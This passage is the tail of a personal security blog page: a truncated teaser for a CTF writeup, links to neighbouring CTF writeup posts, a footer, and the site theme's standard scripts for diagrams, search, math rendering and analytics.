2024. ended up with 13 solves. you can check the detail here ZOO welcome to assembly zoo There are two functions, fallback and commit (intern...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/(ctf)-2024-eth-escape-ctf/" class="btn btn-outline-primary" prompt="Older"><p>(CTF) ETH Escape CTF 2024 writeup (Feel, Vest, MAZE)</p></a> <a href="/posts/(ctf)-sonic-jailbreak-hackathon/" class="btn btn-outline-primary" prompt="Newer"><p>(CTF) Sonic Jailbreak hackathon writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/snwo_kr">snwo</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web3/">web3</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-H9FVY2NFPZ"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-H9FVY2NFPZ'); }); </script>
